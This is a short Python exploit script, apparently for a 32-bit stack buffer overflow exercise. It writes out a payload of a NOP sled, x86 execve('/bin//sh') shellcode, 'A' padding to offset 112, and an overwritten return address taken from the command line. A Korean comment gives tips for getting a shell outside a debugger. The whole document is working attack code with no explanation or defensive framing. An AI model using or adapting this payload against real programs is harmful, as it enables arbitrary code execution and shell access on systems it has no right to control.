#!/usr/bin/env python3
import sys, struct

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <buf_addr_hex>")
    sys.exit(1)

buf = int(sys.argv[1], 16)
OFFSET = 112  # 0x6c + 4

# x86 execve("/bin//sh",0,0)
sc = (
    b"\x31\xc0\x50"
    b"\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e"
    b"\x89\xe3\x50\x53\x89\xe1"
    b"\x99\xb0\x0b\xcd\x80"
)

nop = b"\x90" * 4
ret = struct.pack("<I", buf)
# gdb 밖에서 쉘 획득 확인을 원할 경우 nop 64, buf+32 정도로 넉넉하게 잡을 것을 추천

payload = (nop + sc).ljust(OFFSET, b"A") + ret
sys.stdout.buffer.write(payload)
